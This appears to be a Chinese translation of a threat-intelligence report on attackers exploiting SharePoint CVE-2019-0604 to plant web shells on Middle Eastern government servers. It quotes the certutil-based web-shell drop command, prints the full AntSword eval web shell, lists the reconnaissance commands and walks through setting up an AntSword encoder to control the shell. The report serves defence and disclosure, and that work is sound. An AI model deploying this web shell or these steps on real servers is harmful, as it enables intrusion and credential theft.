**2019年9月10日发现未知攻击者利用CVE-2019-0604 SharePoint漏洞在中​​东政府组织的网站上安装了多个Web
Shell。这些Web Shell中有Github上免费提供的开源AntSword Web Shell。**

## 综述

使用Shodan搜索可遭受CVE-2019-0604攻击的SharePoint版本的服务器，发现28,881台服务器部署了有漏洞版本的SharePoint。庞大的服务器数量和公开的利用漏洞代码表明CVE-2019-0604仍然是主要的攻击媒介。

通过webshel​​l，攻击者利用Mimikatz工具来转储凭据，并使用Impacket的atexec工具和凭据在其他系统上运行命令，从而横向转移。在2019年9月19日发现相同的Mimikatz上传到中东第二个国家的政府组织。这两个组织的Mimikatz属于同源，因为都是利用.NET编写的自定义加载程序。因此认定这两次入侵都是发自同一组织。  

早在2019年4月首次发现Emissary Panda利用CVE-2019-0604在两个中东国家的政府组织的SharePoint服务器上安装Web
Shell。与四月份的袭击相比，攻击者针对两个不同国家的政府组织利用相同的漏洞，但目前没有证据可以将此次攻击与4月Emissary
Panda攻击联系起来。两次攻击之间相同之处包括利用一个共同的漏洞，相似的工具集和共同的政府受害者。  

## Exploiting CVE-2019-0604  

2019年9月10日发现服务器向以下URL发送HTTP POST请求，可以确定是攻击者利用CVE-2019-0604攻击SharePoint服务器：  

    
    
    /_layouts/15/picker.aspx

攻击者请求时在SharePoint服务器上执行以下命令：

    
    
    C:\Windows\System32\cmd.exe /c echo PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBEZWJ1Zz0idHJ1ZSIgVHJhY2U9ImZhbHNlIiAlPg[..snip..] >   
    
    
    c:\programdata\cmd.txt & certutil -decode c:\programdata\cmd.txt C:\Program Files\Common Files\microsoft shared\Web Server 
    
    Extensions\14\TEMPLATE\LAYOUTS\c.aspx & certutil -decode c:\programdata\cmd.txt C:\Program Files\Common Files\microsoft shared\Web Server 
    
    Extensions\15\TEMPLATE\LAYOUTS\c.aspx & certutil -decode c:\programdata\cmd.txt C:\Program Files\Common Files\microsoft shared\Web Server 
    
    Extensions\16\TEMPLATE\LAYOUTS\c.aspx

上面的命令使用echo将base64编码数据写入名为cmd.txt的文本文件。
然后使用certutil应用程序将cmd.txt文件中的base64编码数据转换为三个不同的SharePoint相关文件夹中的c.aspx。
整个命令的结果将Awen asp.net Webshell保存到SharePoint服务器，并进一步与服务器进行交互。
利用此SharePoint漏洞进行部署的Awen
Webshell的SHA256值为5d4628d4dd89f31236f8c56686925cbb1a9b4832f81c95a4300e64948afede21。  

## Awen Webshell  

在c.aspx上观察到对Webshell的第一个HTTP GET请求是获得Webshell的修改版本。这个HTTP
GET请求是攻击者在利用漏洞之后执行命令之前访问了webshell。 图1显示了Awen
Webshell，除了设置命令提示符的路径和运行命令之外，它几乎没有其他功能。  

![img.png](https://image.3001.net/images/20200205/1580879692_5e3a4f4cc7ddf.png!small)

攻击者使用图1中所示的Awen Web Shell运行各种命令在系统和网络上进行初始探索，包括用户帐户，文件和文件夹，特权组，远程系统和网络配置。
表1显示了发现的命令和部署到服务器的命令。 表1还显示了使用Awen webshell执行的命令之间的时间增量，以深入了解攻击者执行命令的速度。  

![1.PNG](https://image.3001.net/images/20200205/1580879737_5e3a4f7989479.png!small)

## AntSword Webshell  

AntSword是一个模块化Web Shell，攻击者可以将其部署到受感染的服务器上。
客户端应用程序可使不同攻击者用浏览器进行交互。攻击者将脚本发送到目标执行时会使用AntSword Shell
Manager与受感染服务器上的AntSword Webshell进行交互。 在此攻击中部署的bitreeview.aspx AntSword
Webshell（SHA256：15ecb6ac6c637***b2114e6b21b5b18b0c9f5341ee74b428b70e17e64b7da55e）仅162个字节，并且包含以下内容：  

    
    
    %@ Page Language="Jscript"%  
    
    
    % 
    
    eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.
    
    FromBase64String(Request.Item["Darr1R1ng"])),"unsafe"); %

从上面的代码中可以看到，AntSword Webshell除了运行AntSword Shell
Manager提供的脚本外没有其他功能。上面的代码还说明攻击者在AntSword Shell
Manager中创建了自定义的“编码器”，以便能够与上面的代码进行交互。

攻击者使用AntSword Webshell在受感染的服务器上运行各种命令。 以下是此webshell发出的初始命令列表：  

    
    
    whoami
    
    query user
    
    nltest /domain_Trusts
    
    ping -n 1 <redacted domain name>
    
    ipconfig /all
    
    net group /do
    
    net group Exchange Servers /do
    
    ing -n 1 <redacted hostname of Exchange server>
    
    ping -n 1 <redacted hostname of Exchange server>
    
    query user

ping操作表明攻击者试图获得对Microsoft
Exchange服务器的访问权限，此外，第一次ping操作出现拼写错误，表明这些命令是手动输入而不是通过脚本发出的。 图2显示了AntSword Shell
Manager应用程序中的终端界面，攻击者可以通过该界面发出命令。  

![1.PNG](https://image.3001.net/images/20200205/1580879993_5e3a5079cfbea.png!small)

攻击者使用了AntSword
webshell将工具上传到服务器，特别是cURL，一款定制的Mimikatz，以及Impacket的wmiexec和atexec工具的变体。AntSword有一个FileManager界面，它提供了类似于Windows资源管理器的功能，攻击者可以在服务器上传和下载文件。图3显示了AntSword
Shell管理器中的FileManager接口。  

![1.PNG](https://image.3001.net/images/20200205/1580880025_5e3a5099311fc.png!small)

攻击者利用上传的工具向webshell发出命令。例如，cURL工具：cURL.exe ipinfo.io-max–time
5，以确定服务器是否具有对Internet站点的访问权限，并获取受攻击系统的外部IP地址，使用了“net
use”命令，Mimikatz和Impacket工具横向移动。  

## AntSword编码器

使用安装在SharePoint服务器上的antsweard webshell，攻击者必须在antsweard中创建自定义编码模块。AntSword
Shell管理器中的默认编码器无法与bitreeview.aspx
webshell交互。默认的base64编码器不会对Darr1R1ng字段中的数据进行base64编码，而是以明文形式传递数据，如图4中的HTTP
POST请求所示。当我们尝试使用默认的base64编码器与攻击者安装的bitreeview.aspx webshell交互时，服务器返回HTTP
500错误消息响应。  

![img
\(1\).png](https://image.3001.net/images/20200205/1580880082_5e3a50d29b3d7.png!small)

可以确定攻击者必须在AntSword
Shell管理器中创建自定义编码模块，base64对整个darr1ng字段进行了编码，以便与bitreeview.aspx
webshell成功交互。AntSword Shell管理器包含用户创建自定义编码模块的接口，以下为创建自定义编码与webshell交互所需的步骤。

1、首先要打开“AntSword Shell Manager”。根分析攻击者使用了AntSword v2.1  

![1.PNG](https://image.3001.net/images/20200205/1580880150_5e3a511601234.png!small)

2、在与webshell交互之前，必须创建一个自定义编码模块，要创建自定义编码模块可以从菜单中单击AntSword>Encoders管理器  

![2.PNG](https://image.3001.net/images/20200205/1580880160_5e3a5120afca3.png!small)

3、在编码器管理器界面中单击New Encoder按钮  

![1.PNG](https://image.3001.net/images/20200205/1580880235_5e3a516b89c72.png!small)

4、从New Encoder下拉列表中选择ASPX，因为安装在SharePoint服务器上的AntSword webshell是一个ASPX文件  

![2.PNG](https://image.3001.net/images/20200205/1580880252_5e3a517c4ad5e.png!small)

5、命名新的编码器，在本例中默认名称“myencoder”  

![1.PNG](https://image.3001.net/images/20200205/1580880309_5e3a51b59eaf4.png!small)

6、创建新编码器后选择编码器并编辑菜单按钮  

![2.PNG](https://image.3001.net/images/20200205/1580880319_5e3a51bfdb6ed.png!small)

7、打开EditEncoder窗口并提供一个示例编码器用来修改。若要在服务器上使用“bitreeview.aspx”webshell，必须将示例编码器的第24行修改为base64，对内容“darr1ng”字段进行编码。  

![1.PNG](https://image.3001.net/images/20200205/1580880365_5e3a51ed244a2.png!small)

8、为了对“darr1ng”字段进行base64编码，需要修改第24行中显示的代码

![2.PNG](https://image.3001.net/images/20200205/1580880375_5e3a51f78644c.png!small)

9、创建了自定义编码模块后可在shell管理器窗口中添加一个新的shell

![1.PNG](https://image.3001.net/images/20200205/1580880453_5e3a5245084d6.png!small)

10、Add shell允许配置shell的路径、HTTP POST请求中字段名称以及与shell管理器交互的编码模块

![2.PNG](https://image.3001.net/images/20200205/1580880465_5e3a525182f18.png!small)

11、添加以下设置并单击“添加菜单”按钮：

将“Shell url”设置为“bitreeview.aspx”webshell的url（测试中的本地主机）

将“Shell pwd”设置为“darr1ng”

将“Shell type”设置为“ASPX”

选中“myencoder”选择自定义编码器

![1.PNG](https://image.3001.net/images/20200205/1580880706_5e3a53426b81d.png!small)

12、点击Add按钮后可以显示在shell管理器界面中

![2.PNG](https://image.3001.net/images/20200205/1580880726_5e3a5356567fa.png!small)

13、与webshell交互，右键单击shell并从显示的菜单中选择actions，选择终端菜单按钮运行命令

![1.PNG](https://image.3001.net/images/20200205/1580880773_5e3a5385ef995.png!small)

14、AntSword Shell管理器显示命令提示窗口的界面，包括运行webshell的系统的信息，例如操作系统、当前用户、当前工作目录和服务器上的存储卷

![2.PNG](https://image.3001.net/images/20200205/1580880784_5e3a539084080.png!small)

15、在此窗口中发出所需的命令，webshell将运行这些命令并回显

![1.PNG](https://image.3001.net/images/20200205/1580880830_5e3a53beba767.png!small)

16、如果与受损服务器的文件系统交互，可以从Shell管理器中选择file Manager

![2.PNG](https://image.3001.net/images/20200205/1580880844_5e3a53cc290c2.png!small)

## Webshell中相关工具

在分析上传到antsweard webshell的工具时发现Mimikatz，该工具上传到了另一个中东国家政府组织服务器，网址为：  

<redacted domain>/上传文件/green_post.aspx  

虽然无法访问此URL上托管的webshell，也无法查看参与者执行的命令，但在这两个政府组织的入侵都涉及到同一个威胁组。除了Mimikatz工具外，攻击者还将其他工具上传到第二个组织服务器中。表2显示了上传到webshell的可执行文件。

![1.PNG](https://image.3001.net/images/20200205/1580880879_5e3a53ef5d204.png!small)

表2中的Dumpert工具为LSASS转储工具。Dumpert是一个相对较新的工具，在2019年9月23日上传之前没有发现该工具的使用。  

## 总结

攻击者继续利用CVE-2019-0604漏洞攻击SharePoint服务器，微软在2019年3月发布了补丁程序。攻击者在SharePoint服务器上安装webhells，用于运行命令和上传其他工具，转储凭据并横向移动到其他系统。还发现名为Dumpert的凭据转储工具，在以前涉及利用CVE-2019-0604的事件中未见过该工具的使用。

## IoCs

 **Awen Webshell**

> 5d4628d4dd89f31236f8c56686925cbb1a9b4832f81c95a4300e64948afede21

 **AntSword Webshell**

> 15ecb6ac6c637***b2114e6b21b5b18b0c9f5341ee74b428b70e17e64b7da55e

 **Mimikatz**

> da53dcaeede03413ba02802c4be10883c4c28d3d28dee11734f048b90eb3d304

 **Related Tools**

> da53dcaeede03413ba02802c4be10883c4c28d3d28dee11734f048b90eb3d304
>
> 2836cf75fa0538b2452d77848f90b6ca48b7ff88e85d7b006924c3fc40526287
>
> 26d9212ec8dbca45383eb95ec53c05357851bd7529fa0761d649f62e90c4e9fd
>
> a4aca75bcc8f18b8a2316fd67a7e545c59b871d32de0b325f56d22584038fa10
>
> e4e05c9a216c2f2b3925293503b5d5a892c33db2f6ea58753f032b80608c3f2e

 ***参考来源：[unit42](https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/)，由Kriston编译，转载请注明来自FreeBuf.COM**  

